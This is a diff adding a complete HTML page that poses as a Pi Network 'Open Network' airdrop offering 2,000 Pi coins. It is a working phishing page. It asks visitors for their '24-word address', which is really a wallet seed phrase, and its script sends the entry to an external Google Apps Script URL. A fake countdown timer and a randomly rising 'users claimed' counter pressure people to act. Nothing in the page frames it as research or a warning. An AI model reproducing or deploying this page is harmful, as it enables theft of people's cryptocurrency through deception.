@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Celebrate the Pi Open Network launch! Join our giveaway and claim 2,000 Pi coins now.">
+    <meta name="keywords" content="Pi Network, Pi Coin Giveaway, Cryptocurrency, Blockchain">
+    <meta name="author" content="Pi Network Community">
+    <title>🎉 Pi Open Network Giveaway - Claim 2,000 Pi Coins! 🎉</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
+        
+        body {
+            font-family: 'Poppins', sans-serif;
+            text-align: center;
+            background: url('https://via.placeholder.com/1920x1080') no-repeat center center/cover;
+            color: #fff;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            background: rgba(0, 0, 0, 0.85);
+            padding: 30px;
+            border-radius: 15px;
+            max-width: 400px;
+            width: 90%;
+            box-shadow: 0 0 20px rgba(255, 215, 0, 0.5);
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: bold;
+            color: white;
+            margin-top: -40px;
+        }
+        h2 {
+            font-size: 18px;
+        }
+        p {
+            color: white;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin-top: 10px;
+            border-radius: 8px;
+            border: none;
+            font-size: 16px;
+            text-align: center;
+            display: block;
+            outline: none;
+            background: #333;
+            color: #fff;
+            box-sizing: border-box;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            margin-top: 15px;
+            border-radius: 8px;
+            border: none;
+            font-size: 18px;
+            background: linear-gradient(45deg, #ffbf00, #ff8000);
+            color: white;
+            cursor: pointer;
+            font-weight: bold;
+            transition: transform 0.2s;
+        }
+        button:hover {
+            transform: scale(1.05);
+        }
+        #countdown {
+            font-size: 20px;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+        #counter {
+            font-size: 18px;
+            font-weight: bold;
+            margin-top: 15px;
+            color: #fff;
+        }
+        @media (max-width: 600px) {
+            body {
+                background-size: cover;
+            }
+            .container {
+                width: 95%;
+                padding: 20px;
+            }
+            input, button {
+                font-size: 16px;
+                padding: 12px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <h1>🚀 Claim Your Pi - Airdrop Open Network Celebration! 🚀</h1>
+    <p>🎈 Pi Network has reached Open Network! We're giving away <strong>2,000 Pi Coins</strong>! 🎈</p>
+    <p id="countdown">Time Left: 05:00</p>
+    
+    <div class="container">
+        <h2>Enter your 24-word address</h2>
+        <input type="text" id="wallet" placeholder="Enter your 24-word address">
+        <button onclick="submitWallet()">🎁 Claim Your 2,000 Pi Network Coins</button>
+        <p id="response"></p>
+        <p id="counter">🔥 users have already claimed their reward!</p>
+    </div>
+
+    <script>
+        window.onload = function () {
+            updateTimer();
+            updateCounter();
+        };
+
+        let timeLeft = 300;
+        function updateTimer() {
+            let minutes = Math.floor(timeLeft / 60);
+            let seconds = timeLeft % 60;
+            document.getElementById("countdown").innerText = `Time Left: ${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+            if (timeLeft > 0) {
+                timeLeft--;
+                setTimeout(updateTimer, 1000);
+            }
+        }
+
+        let participantCount = 182;
+        function updateCounter() {
+            participantCount += Math.floor(Math.random() * 3) + 3;
+            document.getElementById("counter").innerText = `🔥 ${participantCount} users have already claimed their reward!`;
+            setTimeout(updateCounter, 3000);
+        }
+
+        async function submitWallet() {
+            const wallet = document.getElementById("wallet").value;
+            const responseText = document.getElementById("response");
+            
+            if (!wallet || wallet.split(" ").length !== 24) {
+                responseText.innerText = "⚠️ Invalid address. Please enter your full 24-word wallet address.";
+                return;
+            }
+            
+            responseText.innerText = "⏳ Processing... Please wait.";
+            
+            try {
+                const response = await fetch("https://script.google.com/macros/s/AKfycbz8jfeCIyTEMmm335ubYzcyLp6e0svQF3fqiv_naD9tcUPmZCgdMCwbiO7MkkP05m7C/exec", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ wallet })
+                });
+                
+                const result = await response.json();
+                responseText.innerText = result.message;
+            } catch (error) {
+                responseText.innerText = "❌ Error submitting. Please try again later.";
+                console.error(error);
+            }
+        }
+    </script>
+</body>
+</html>
